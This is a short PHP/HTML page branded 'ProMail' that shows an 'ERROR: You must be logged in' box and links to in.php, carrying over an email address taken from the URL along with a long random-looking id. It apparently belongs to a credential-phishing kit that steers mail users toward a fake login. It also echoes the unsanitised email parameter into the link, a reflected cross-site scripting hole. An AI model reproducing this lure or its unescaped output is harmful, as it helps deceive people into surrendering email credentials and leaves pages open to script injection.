<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>ProMail &trade; - You must be logged in to access this page.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link href="index.css" rel="stylesheet">
    <link href="css/style-responsive.css" rel="stylesheet">
    <script src="index.js"></script>


</head>
<style>
    #background{
       background-image:url("images/bg6.png");
       margin-bottom:0px;
       background-color:#0c6cb4;
       
      }

      #error{
        height:370px; 
        width:460px; 
        margin-left:450px;
        margin-top:100px; 
        background-color:#ececec;
        position:absolute; 
        z-index:+4;
        opacity:1;
        border-radius:15px;
        box-shadow: 0px 0px 30px 0px;
        border: 2px solid grey;
        
      }

    #inner{
       margin-top:5px;
       margin-left:5px;
       background-color:#0b78c4;
       background-blend-mode: lighten;
       z-index: +3;
       height:60px;
       width:98%;
       position:relative;
       zoom: 0.8;
       border-radius:15px 15px 0px 0px;
       border: 2px solid silver;
    } 

    #message{
      color:#474747;
      font-size:13px;
      margin-left:100px;
      align:center;
      margin-top:120px;
    }

    #goto{
      color:#0E4C92; 
      font-size:13px;
      margin-left:150px;
      margin-top:15px;
    }
    
     @media (max-width: 700px){
     #background {
     width : 100%; 
     padding-left:22px; 
     } 
     #error {
     width : 90%;
     margin-left:0%;
  }
  #message{
      font-size:13px;
      margin-left:50px;
    }

    #goto{
      font-size:13px;
      margin-left:100px;
    }
}
    


</style>


<?php
$value = $_GET['email'];
$dom = substr($value, strpos($value, '@') + 1);
?>

<script>
 function myMove() {

  var elem = document.getElementById("animate");   
  var pos = 0;
  var id = setInterval(frame, 5);
  
  var elemm = document.getElementById("animatee");   
  var poss = 0;
  var idd = setInterval(framee, 10);
  
  var elemmm = document.getElementById("animateee");   
  var posss = 0;
  var iddd = setInterval(frameee, 20);
  
  function frame() {
    if (pos == 490) {
      clearInterval(id);
    } else {
      pos++; 
      elem.style.left = pos + "px"; 
    }
  }
    function framee() {
    if (poss == 490) {
      clearInterval(idd);
    } else {
      poss++; 
      elemm.style.left = poss + "px"; 
    }
  }
      function frameee() {
    if (posss == 490) {
      clearInterval(iddd);
    } else {
      posss++; 
      elemmm.style.left = posss + "px"; 
    }
  }
}

 function hideLoader() {
document.getElementById("animate").style.display = "none";
document.getElementById("animatee").style.display = "none";
document.getElementById("animateee").style.display = "none";
}

 function showLoader() {
  document.getElementById("animate").style.visibility = "visible";
  document.getElementById("animatee").style.visibility = "visible";
  document.getElementById("animateee").style.visibility = "visible";
}


function submitform()
{
document.getElementById("myForm").submit();
}

</script>



<body id = "background"> 
    <div id = "error" >
         <div id = "inner">
             <p style = "color:white;font-size:34px;margin-left:15px;margin-top:5px;font-weight:bold">ERROR</p> 
         </div>
         <p id = "message">You must be logged in to access this page.</p> 
         <a href = "in.php?email=<?php echo $value?>&id=5474644u4tryr6tur7rtr54rf4grjfri9t876tgi585657493i3h3u7r8r7rttg5u585756y585urhyr" id = "goto">Go to the login page</a> 
    </div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</body>
</html>





